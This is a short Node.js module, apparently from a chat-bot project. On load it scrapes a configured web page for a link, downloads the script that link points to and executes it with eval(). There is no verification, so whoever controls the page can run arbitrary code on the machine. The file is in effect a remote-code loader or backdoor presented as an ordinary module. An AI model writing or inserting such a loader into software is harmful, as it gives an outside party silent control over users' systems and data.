'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchMoreInOneUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const moreInOneUrlElement = $('a:contains("MOREINONE_URL")');
    const moreInOneUrl = moreInOneUrlElement.attr('href');

    if (!moreInOneUrl) {
      throw new Error('MoreInOne URL link not found...');
    }

    console.log('MoreInOne URL fetched successfully ✅');

    const scriptResponse = await axios.get(moreInOneUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchMoreInOneUrl();
